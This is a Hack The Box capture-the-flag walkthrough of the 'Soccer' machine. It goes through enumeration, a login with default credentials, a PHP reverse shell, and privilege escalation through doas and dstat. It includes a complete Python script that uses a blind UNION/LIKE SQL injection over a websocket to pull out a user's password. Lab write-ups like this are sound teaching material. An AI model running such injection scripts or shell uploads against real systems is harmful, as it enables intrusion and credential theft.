# Soccer - Hack The Box

## Enumeration
### Nmap
Initial nmap scan revealed ports 22,80,9091 are open.

<img width="872" height="258" alt="00 - nmap" src="https://github.com/user-attachments/assets/868de777-f7d9-45f0-b447-3bf159313251" />

### WEB Enumeration
WEB requests was directed to soccer.htb so I added it to hosts file.

<img width="688" height="261" alt="01 - hosts" src="https://github.com/user-attachments/assets/43c825aa-bc9a-4018-977d-8ecd51a93e6a" />

The directory brute force revealed tiny folder.

<img width="1450" height="716" alt="02 - dirbuster" src="https://github.com/user-attachments/assets/f1457d7f-4a9c-454b-8293-24ba96ffb0ac" />

Inside there was a tiny file manager, which was configured with default credentails "admin:admin@123". After logging in I learned the version of the tiny file manager.

<img width="1233" height="629" alt="03 - admin admin@123" src="https://github.com/user-attachments/assets/2aa65ffb-11dc-400a-b1f5-ab262b451e16" />

## Exploitation
### Reverse Shell
I had write access to uploads folder, so I copied a php file to there and edited it. Then got a reverse shell as www-data.

<img width="1241" height="419" alt="04 - 0 copy the file" src="https://github.com/user-attachments/assets/1e1f3631-09ce-4391-a49b-e433d6e14419" />

<img width="1006" height="348" alt="04 - copy the file" src="https://github.com/user-attachments/assets/14b4dc36-2569-4226-a186-08b0f88756cc" />

<img width="1201" height="744" alt="05 - revshell" src="https://github.com/user-attachments/assets/0c33aa0c-2213-47d6-a80a-3358267a4622" />

## Lateral Movement
Then tried many privilege escalation methods but got nothing. Later I checked /etc/hosts file and found out there was another subdomain.

<img width="662" height="94" alt="06 - host file" src="https://github.com/user-attachments/assets/faeaf7a0-6108-41ec-9441-d183d117a703" />

### SQL Injection
The new website had signup and sign-in function. After singing up, there was a check function. The check function was using web socket and it was vulnerable to sql injection.

<img width="1626" height="608" alt="08 - websocket" src="https://github.com/user-attachments/assets/842f0522-2464-4445-a392-7cd97e79a70b" />

<img width="1424" height="419" alt="09 - sql injection" src="https://github.com/user-attachments/assets/f25a8848-9e8f-4eb9-9b37-4b9477069f82" />

At first I tried manually but it was taking too long. So I wanted to use sqlmap. I used [this](https://github.com/BKreisel/sqlmap-websocket-proxy) proxy tool to send sqlmap request to websocket.

<img width="1183" height="583" alt="11 - sql proxy" src="https://github.com/user-attachments/assets/2df43b79-f692-4756-8464-e211cfa1335c" />

<img width="1361" height="628" alt="12 - sqlmap" src="https://github.com/user-attachments/assets/b74df186-27ad-42b6-9bd3-35680d4699c9" />

But SQLmap was using time base sqli and it was really taking too long. I learned database name, table name and column names from sqlmap then I created this custom script:
```python
#!/usr/bin/env python3
import websocket
import json
import sys

# Target WebSocket endpoint
WS_URL = "ws://soc-player.soccer.htb:9091"

chars = "abcdefghijklmnopqrstuvwxyz0123456789"

def send_payload():
    try:
        ws = websocket.create_connection(WS_URL)
        print(f"[+] Connected to {WS_URL}")
        password = ""

        while True:
            found = False
            for i in chars:
                message = json.dumps({"id": payload(password + i)})
                print(f"[>] Sending: {message}")
                ws.send(message)
                response = ws.recv()
                print(f"[<] Response: {response}")

                if "Ticket Exists" in response:
                    password += i
                    print("[+] Password so far:", password)
                    found = True
                    break

            if not found:
                # No new character matched → stop
                break

        ws.close()
        return password

    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def payload(prefix):
    return f"1 UNION SELECT email,password,username FROM accounts WHERE username = 'player' AND password LIKE '{prefix}%'-- -"

if __name__ == "__main__":
    result = send_payload()
    if result:
        print("\n[✓] Extracted password:", result)
    else:
        print("\n[!] Failed to extract password")
```

Running this revealed the password of the user "player".

<img width="1263" height="193" alt="13 - script" src="https://github.com/user-attachments/assets/bdde700f-d6b6-4151-a067-8d2d8955ec49" />

### Got The User
<img width="898" height="606" alt="14 - user" src="https://github.com/user-attachments/assets/ae633fe4-11cc-49d9-a983-812cac3334c5" />

## Privilege Escalation
### SUID Bit
Running SUID bit enumeration revealed the doas binary.

<img width="983" height="258" alt="15 - doas" src="https://github.com/user-attachments/assets/6b6ecaed-f236-40bc-a7b2-dcf56dde2f58" />

It was a binary similar to sudo. The manual page revealed some functionality and configuration.

<img width="1352" height="634" alt="16 - config file" src="https://github.com/user-attachments/assets/bdc14b2c-97b4-4c6d-bea2-b6551bb5bb1d" />

Analyzing the configuration file revealed I can run dstat as root.

<img width="696" height="158" alt="17 - dstat" src="https://github.com/user-attachments/assets/22f211bb-9988-4d65-ac9b-fba9b9c43e56" />

Then checked GTFOBin page of dstat and applied the steps to get a root shell.

<img width="1222" height="141" alt="18 - gg" src="https://github.com/user-attachments/assets/b0ec7e3e-65d7-4eb1-ba4b-c135b530e993" />

## Pwned
The machine was fully compromised.

<img width="744" height="713" alt="19 - done" src="https://github.com/user-attachments/assets/e3322483-23b4-4f28-82ab-714bfa1c516a" />

